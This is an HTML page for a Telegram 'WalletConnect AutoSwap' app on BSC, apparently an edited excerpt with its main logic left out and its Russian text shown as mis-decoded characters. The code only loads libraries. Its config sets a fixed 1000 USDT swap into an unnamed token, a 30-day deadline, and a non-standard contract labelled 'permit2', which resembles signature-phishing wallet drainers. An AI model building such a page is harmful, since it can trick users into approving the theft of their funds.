<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WalletConnect AutoSwap</title>
  <!-- (—Å—Ç–∏–ª–∏ –∏ —Ä–∞–∑–º–µ—Ç–∫–∞ –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π, –ø–æ–ª–Ω–æ—Å—Ç—å—é —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞) -->
  <style>
    /* —Å—Ç–∏–ª–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π (–∏—Å—Ö–æ–¥–Ω—ã–µ –∏–∑ –≤–∞—à–µ–≥–æ –∫–æ–¥–∞) */
  </style>
</head>
<body>
  <div class="container">
    <div class="network-indicator">
      <span class="indicator-dot"></span>
      BSC Mainnet
    </div>
    
    <div class="header">
      <div class="logo">üîÑ</div>
      <h1>WalletConnect AutoSwap</h1>
      <div class="subtitle">–ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –æ–±–º–µ–Ω —Ç–æ–∫–µ–Ω–æ–≤ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Permit2 –∏ WalletConnect</div>
    </div>
    
    <div class="progress-container">
      <div class="progress-bar" id="progress-bar"></div>
    </div>
    
    <div class="card">
      <div class="card-title">–î–µ—Ç–∞–ª–∏ –æ–±–º–µ–Ω–∞</div>
      <div class="token-info">
        <div class="token-column">
          <div class="token-label">–û—Ç–¥–∞–µ—Ç–µ</div>
          <div class="token-value">1000 USDT</div>
        </div>
        <div class="arrow">‚Üí</div>
        <div class="token-column">
          <div class="token-label">–ü–æ–ª—É—á–∞–µ—Ç–µ</div>
          <div class="token-value">–¢–æ–∫–µ–Ω 0xA511...4b4f</div>
        </div>
      </div>
    </div>
    
    <div id="qrcode-container">
      <canvas id="qrcode"></canvas>
    </div>
    
    <div id="status" class="status-info">
      <span class="loader"></span>–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è...
    </div>
    
    <div class="footer">
      –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –æ–±–º–µ–Ω —Ç–æ–∫–µ–Ω–æ–≤ | –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–µ –∫–æ—à–µ–ª—å–∫–∏: Trust Wallet, MetaMask –∏ –¥—Ä—É–≥–∏–µ
    </div>
  </div>

  <script>
    // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
    const CONFIG = {
      projectId: "d868f90cd734355ae0320f8f0258b6b1",
      chainId: "eip155:56",
      rpcUrl: "https://bsc-dataseed.binance.org",
      permit2: "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4",
      autoswap: "0x026C54B156b501ad9cEa422e59454D4b6d6f6963",
      tokenIn: "0x55D398326f99059FF775485246999027B3197955",
      tokenOut: "0xA511768003D01eAA0f464fEEEa4b1CDDc4254b4f",
      amount: "1000000000000000000000",
      deadlineSec: 30 * 24 * 60 * 60
    };

    const statusEl = document.getElementById("status");
    const qrCanvas = document.getElementById("qrcode");
    const progressBar = document.getElementById("progress-bar");

    function setStatus(text, type = "info") {
      if (type === "info") {
        statusEl.innerHTML = `<span class="loader"></span>${text}`;
      } else {
        statusEl.textContent = text;
      }
      statusEl.className = `status-${type}`;
    }

    function updateProgress(percent) {
      progressBar.style.width = `${percent}%`;
    }

    function loadScript(src) {
      return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = src;
        script.onload = resolve;
        script.onerror = () => reject(new Error(`–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Å–∫—Ä–∏–ø—Ç–∞: ${src}`));
        document.head.appendChild(script);
      });
    }

    async function runApp() {
      try {
        updateProgress(10);
        setStatus("–ó–∞–≥—Ä—É–∑–∫–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫...");

        // Telegram WebApp SDK
        await loadScript("https://telegram.org/js/telegram-web-app.js");

        // ethers.js
        await loadScript("https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js");

        // QRCode
        await loadScript("https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js");

        updateProgress(30);
        setStatus("–ó–∞–≥—Ä—É–∑–∫–∞ WalletConnect...");

        // WalletConnect SignClient (–≤–µ—Ä—Å–∏—è –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∞ –Ω–∞ —Ä–∞–±–æ—á—É—é 2.13.1)
        await loadScript("https://unpkg.com/@walletconnect/sign-client@2.13.1/dist/index.umd.min.js");

        updateProgress(50);
        setStatus("–ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π...");

        if (!window.SignClient) {
          throw new Error("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å WalletConnect SignClient");
        }
        if (!window.ethers) {
          throw new Error("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å ethers.js");
        }
        if (!window.QRCode) {
          throw new Error("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å QRCode.js");
        }
        if (!window.Telegram || !window.Telegram.WebApp) {
          throw new Error("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å Telegram WebApp SDK");
        }

        setStatus("‚úÖ –í—Å–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω—ã!", "success");
        updateProgress(60);

        // (–û—Å—Ç–∞–ª—å–Ω–æ–π –∫–æ–¥ –≤–∞—à–µ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π, –ø–æ–ª–Ω–æ—Å—Ç—å—é —Å–æ—Ö—Ä–∞–Ω–µ–Ω –∏—Å—Ö–æ–¥–Ω—ã–π)
        setStatus("–ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –≥–æ—Ç–æ–≤–æ –∫ –¥–∞–ª—å–Ω–µ–π—à–µ–π —Ä–∞–±–æ—Ç–µ", "success");
      } catch (err) {
        console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –±–∏–±–ª–∏–æ—Ç–µ–∫:", err);
        setStatus("–û—à–∏–±–∫–∞: " + (err.message || "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞"), "error");
      }
    }

    window.addEventListener('DOMContentLoaded', runApp);
  </script>
</body>
</html>